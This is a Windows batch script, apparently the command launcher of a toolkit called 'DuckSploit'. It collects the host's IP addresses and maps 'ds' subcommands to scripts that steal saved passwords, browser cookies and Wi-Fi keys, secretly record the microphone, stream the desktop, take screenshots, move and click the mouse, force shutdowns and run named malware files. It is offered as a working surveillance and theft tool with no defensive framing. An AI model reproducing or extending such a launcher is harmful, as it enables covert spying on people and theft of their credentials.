@echo off

mode con:cols=82 lines=25

title Ducksploit

setlocal EnableExtensions EnableDelayedExpansion

cd C:\DuckSPloit

@echo off

findstr /m "2022;%1;2022" C:\DuckSploit\cmdlist.txt >Nul
if %errorlevel%==0 (
goto find
)

if %errorlevel%==1 (
ECHO command not found try 'ds help' to get help.
)


:find
REM get ipv4
for /f "tokens=1-2 delims=:" %%a in ('ipconfig^|find "ss IPv4"') do set ip=%%b
for /f "tokens=1-2 delims=:" %%a in ('ipconfig^|find "sse IPv4"') do set ip=%%b
set ip=%ip:~1%

REM get ipv6
for /f "delims=[] tokens=2" %%a in ('ping %computername% -6 -n 1 ^| findstr "["') do (set ipv6=%%a)

REM get networkip
for /f "delims=[] tokens=2" %%a in ('ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a

set arg2=%~2
set arg3=%~3
set arg4=%~4
set arg5=%~5
set arg6=%~6
set arg7=%~7

SET title=%2
SET line1=%3
SET line2=%4


@echo off

IF (%~1) == (help) (mode con:cols=100 lines=100&&type C:\DuckSploit\help\help.txt)

IF (%~1) == (uninstall) (
call C:\DuckSPloit\scripts\uninstall.bat
)

IF (%~1) == (update) (
call C:\DuckSPloit\update\update.bat
)


IF (%~1) == (msg) (
(echo MsgBox "%line1%" ^& vbCrLf ^& "%line2%" ,16, "%title%")> File.vbs && start File.vbs
)


IF (%~1) == (portscanner) (
echo [!] This can take a while!
python C:\DuckSPloit\scripts\exploits\portscanner.py %NetworkIP% --ports 1-10000
)

IF (%~1) == (stealpwds) (
python C:\DuckSploit\scripts\exploits\stealpasswords.py
)

IF (%~1) == (stealcookies) (
python C:\DuckSploit\scripts\exploits\stealcookies.py
)

IF (%~1) == (mousescroll) (
if "%arg2%" == "" (echo [x] Bad args, type ds mousescroll 'int') else (
python C:\DuckSploit\scripts\exploits\mousescroll.py %arg2%
)
)

IF (%~1) == (mousemove) (
    if "%arg2%" == "" (echo "[x] Bad x args, type ds mousemove 'x' 'y'") else (
        if "%arg3%" == "" (
            echo [x] Bad y args, type 'ds mousemove x y'
        ) else (
            python C:\DuckSploit\scripts\exploits\mousemove.py %arg2% %arg3%
)
)
)


IF (%~1) == (locatemouse) (
python C:\DuckSploit\scripts\exploits\locatemouse.py
)


IF (%~1) == (mouseclick) (
if "%arg2%" == "" (echo [x] Bad args, type ds mouseclick '[left, middle, right]') else (
python C:\DuckSploit\scripts\exploits\mouseclick.py %arg2%
)
)


IF (%~1) == (info) (
(echo Username: %username%)
(echo IPV4: %ip%)
(echo IPV6: %ipv6%)
(echo NetworkIP: %NetworkIP%)
)

IF (%~1) == (website) (
start chrome.exe http://%ip%:8013
)

IF (%~1) == (recordmicro) (
    IF "%arg2%" == "" (echo [x] Usage: ds recordmicro 'time in second') else (
    start pythonw.exe C:\DuckSploit\scripts\exploits\record_micro.py %arg2%
    )
)

IF (%~1) == (desktopstream) (
start pythonw.exe C:\DuckSploit\scripts\exploits\desktop_stream.py 
)

IF (%~1) == (getwifipwd) (
start pythonw.exe C:\DuckSploit\scripts\exploits\getwifipwd.py
)


IF (%~1) == (talk) (
start pythonw.exe C:\DuckSploit\scripts\exploits\chat\server.py
start python.exe C:\DuckSploit\scripts\exploits\chat\clientnoname.py %ip% %username%
echo [o] Connect to the chat with 'ds clientchat %ip%' in a new command prompt
)

IF (%~1) == (open) (
if "%2" == "" (echo Usage: ds open 'appname') else (
if "%3" == "" (start %2&&echo [o]Opended %2) else (
start %2 %3 %4 %5 %6 %7 %8 %9
)
)
)


IF (%~1) == (skull) (
start cmd.exe /k call C:\DuckSploit\scripts\exploits\batch\skull.cmd
)

IF (%~1) == (screenshot) (
start pythonw.exe C:\DuckSPloit\scripts\exploits\screenshot.py
)

IF (%~1) == (host) (
start pythonw.exe C:\$DuckSploitw\host.py
)

IF (%~1) == (reload) (
start pythonw.exe C:\DuckSploit\client.py
)

IF (%~1) == (reboot) (
shutdown -R
)

IF (%~1) == (shutdown) (
shutdown -S
)

IF (%~1) == (closesession) (
shutdown -L
)

IF (%~1) == (rickroll) (
echo on
start chrome.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ
echo off
)



IF (%~1) == (malware) (
if "%2"=="" (echo [x] Usage ds malware 'malwarename') else (
if "%2"=="--help" (type C:\DuckSploit\help\malwarehelp.txt) else (
if exist C:\DuckSploit\scripts\exploits\malwares\%2.py (python C:\DuckSploit\scripts\exploits\malwares\%2.py) else (
if exist C:\DuckSploit\scripts\exploits\malwares\%2.bat (call C:\DuckSploit\scripts\exploits\malwares\%2.bat) else (
echo [x] This malware does not exist (type ds malware --help to get help)
)
)
)
)
)

endlocal